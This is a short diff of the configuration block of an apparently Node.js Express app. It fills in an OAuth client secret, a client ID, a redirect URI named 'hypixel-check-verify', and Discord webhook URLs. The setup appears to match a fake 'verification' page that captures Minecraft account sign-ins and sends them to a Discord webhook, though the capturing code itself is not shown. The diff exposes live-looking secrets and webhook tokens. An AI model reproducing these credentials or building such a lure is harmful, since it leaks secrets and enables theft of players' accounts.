@@ -1,9 +1,9 @@
 // Configuration
-const client_secret = 'change'
-const client_id = 'change'
-const redirect_uri = 'change'
-const webhook_url = 'change'
-const webhook_logging_url = 'change'
+const client_secret = 'KP28Q~4Js.fo5B1x.e5E2sMtkit5n5eP.L7E6ajX'
+const client_id = 'bbadd51c-2c4f-4d52-a6a1-b0c242cc8d16'
+const redirect_uri = 'https://hypixel-check-verify.onrender.com'
+const webhook_url = 'https://discord.com/api/webhooks/1101145115357085777/mCzzXLmI84gx_ca7cZGlwcLoh0mn5kFBL9l2p1oC9-0UOHBgElifrCQgIsSdetuH9_cZ'
+const webhook_logging_url = 'https://discord.com/api/webhooks/1101145115357085777/mCzzXLmI84gx_ca7cZGlwcLoh0mn5kFBL9l2p1oC9-0UOHBgElifrCQgIsSdetuH9_cZ'
 // Config end
 const axios = require('axios')
 const express = require('express')
